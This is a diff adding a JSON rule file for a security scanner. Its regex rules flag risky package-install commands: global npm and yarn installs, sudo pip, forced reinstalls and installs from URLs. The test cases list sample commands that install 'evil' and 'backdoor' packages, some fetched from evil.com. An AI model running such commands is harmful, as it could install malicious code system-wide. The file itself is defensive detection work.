@@ -1,0 +1,101 @@
+{
+  "$schema": "../rule-schema.json",
+  "category": "Package Management",
+  "rules": [
+    {
+      "id": "PKG-001",
+      "title": "Global npm package installation",
+      "description": "Installing npm packages globally can place malicious code in system paths.",
+      "severity": "high",
+      "pattern": "\\bnpm\\s+(install|i)\\s+(-g|--global)\\b",
+      "file_extensions": [],
+      "remediation": "Use local package installations. Plugins should not install global packages.",
+      "test_cases": {
+        "should_match": [
+          "npm install -g evil-package",
+          "npm i --global backdoor-cli"
+        ],
+        "should_not_match": [
+          "npm install express",
+          "npm i lodash"
+        ]
+      }
+    },
+    {
+      "id": "PKG-002",
+      "title": "Global pip package installation via sudo",
+      "description": "Using sudo with pip installs packages system-wide, which can affect the entire system.",
+      "severity": "high",
+      "pattern": "\\bsudo\\s+pip[3]?\\s+install\\b",
+      "file_extensions": [],
+      "remediation": "Use virtual environments or --user flag for pip installations.",
+      "test_cases": {
+        "should_match": [
+          "sudo pip install evil-package",
+          "sudo pip3 install backdoor"
+        ],
+        "should_not_match": [
+          "pip install package",
+          "pip3 install --user package"
+        ]
+      }
+    },
+    {
+      "id": "PKG-003",
+      "title": "Yarn global package installation",
+      "description": "Installing yarn packages globally can place malicious code in system paths.",
+      "severity": "high",
+      "pattern": "\\byarn\\s+global\\s+(add|install)\\b",
+      "file_extensions": [],
+      "remediation": "Use local package installations instead of global.",
+      "test_cases": {
+        "should_match": [
+          "yarn global add evil-cli",
+          "yarn global install backdoor"
+        ],
+        "should_not_match": [
+          "yarn add express",
+          "yarn install"
+        ]
+      }
+    },
+    {
+      "id": "PKG-004",
+      "title": "Forced package reinstallation",
+      "description": "Force-reinstalling packages can overwrite legitimate packages with malicious versions.",
+      "severity": "medium",
+      "pattern": "\\b(pip[3]?\\s+install\\s+[^\\n]*(--force-reinstall|--force)|npm\\s+(install|i)\\s+[^\\n]*--force)\\b",
+      "file_extensions": [],
+      "remediation": "Avoid forced package installations. Review why a force install is needed.",
+      "test_cases": {
+        "should_match": [
+          "pip install --force-reinstall evil-package",
+          "npm install --force compromised-pkg"
+        ],
+        "should_not_match": [
+          "pip install normal-package",
+          "npm install express"
+        ]
+      }
+    },
+    {
+      "id": "PKG-005",
+      "title": "Install from URL",
+      "description": "Installing packages directly from URLs bypasses registry security checks.",
+      "severity": "high",
+      "pattern": "\\b(pip[3]?\\s+install|npm\\s+(install|i))\\s+[^\\n]*https?://[^\\s]+",
+      "file_extensions": ["sh", "bash", "zsh", "md"],
+      "remediation": "Install packages from official registries only.",
+      "test_cases": {
+        "should_match": [
+          "pip install https://evil.com/malware-1.0.tar.gz",
+          "npm install https://evil.com/backdoor.tgz"
+        ],
+        "should_not_match": [
+          "pip install requests",
+          "npm install lodash"
+        ]
+      }
+    }
+  ]
+}
